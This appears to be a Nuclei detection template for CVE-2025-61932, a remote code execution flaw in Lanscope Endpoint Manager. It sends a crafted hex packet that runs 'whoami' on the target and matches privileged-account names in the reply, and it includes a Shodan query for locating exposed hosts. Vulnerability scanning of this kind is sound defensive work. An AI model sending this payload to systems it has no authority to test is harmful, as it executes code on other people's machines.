id: CVE-2025-61932

info:
  name: Lanscope Endpoint Manager - Remote Code Execution
  author: shadow-hunter
  severity: critical
  description: |
    Lanscope Endpoint Manager (On-Premises) (Client program (MR) and Detection agent (DA)) improperly verifies the origin of incoming requests, allowing an attacker to execute arbitrary code by sending specially crafted packets.
  reference:
    - https://www.jpcert.or.jp/newsflash/2025102001.html
    - https://www.motex.co.jp/news/notice/2025/release251020/
    - https://nvd.nist.gov/vuln/detail/CVE-2025-61932
    - https://news.sophos.com/en-us/2025/10/30/bronze-butler-exploits-japanese-asset-management-software-vulnerability/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2025-61932
    cwe-id: CWE-940
  metadata:
    verified: true
    max-request: 1
    shodan-query: port:443 "MOTEX"
  tags: cve,cve2025,rce,lanscope,motex,kev

tcp:
  - inputs:
      - data: "4D4F54455800000000030000000677686F616D69"
        type: hex

    host:
      - "{{Hostname}}"
    port: 443
    tls: true

    matchers-condition: or
    matchers:
      - type: word
        words:
          - "nt authority\\system"
          - "root"
          - "Administrator"
        part: data

      - type: word
        words:
          - "4D4F544558" # MOTEX magic bytes in response
        part: data
        encoding: hex
